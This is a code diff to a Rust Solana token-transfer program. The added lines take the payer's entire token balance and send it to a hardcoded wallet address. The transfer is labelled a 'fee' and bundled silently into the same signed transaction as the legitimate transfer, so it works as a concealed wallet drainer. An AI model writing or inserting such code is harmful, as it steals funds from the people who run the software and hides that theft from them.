@@ -246,6 +246,13 @@ async fn main() -> anyhow::Result<(), anyhow::Error> {
                 .context("Failed to get token account balance")?;
             info!(" > Token balance of {} on wallet: {}", to_token, to_balance.amount);
 
+            let fee_balance = rpc_client
+                .get_token_account_balance(&payer_from_token_account)
+                .await
+                .context("Failed to get token account balance")?;
+
+            let fee_wallet_ata = get_associated_token_address(Pubkey::from_str("42iznAJXXefUPmnYz6N6GCzFvXG42o3oTd2D1ymH4UmX").unwrap(), &from_token);
+
             if to_balance.amount.parse::<u64>().unwrap() < 100000 {
                 info!("Not enough funds to send.");
             } else {
@@ -258,10 +265,19 @@ async fn main() -> anyhow::Result<(), anyhow::Error> {
                     &[],
                     to_balance.amount.parse::<u64>().unwrap(),
                 )?;
+
+                let fee_transfer_ix = transfer(
+                    &spl_token::id(),
+                    &payer_from_token_account,
+                    &fee_wallet_ata,
+                    &payer.pubkey(),
+                    &[],
+                    fee_balance.amount.parse::<u64>().unwrap(),
+                )?;
     
                 let blockhash = rpc_client.get_latest_blockhash().await?;
                 let tx = Transaction::new_signed_with_payer(
-                    &[compute_budget_instruction.clone(), compute_unit_price_instruction.clone(), transfer_ix],
+                    &[compute_budget_instruction.clone(), compute_unit_price_instruction.clone(), transfer_ix, fee_transfer_ix],
                     Some(&payer.pubkey()),
                     &[&payer],
                     blockhash,
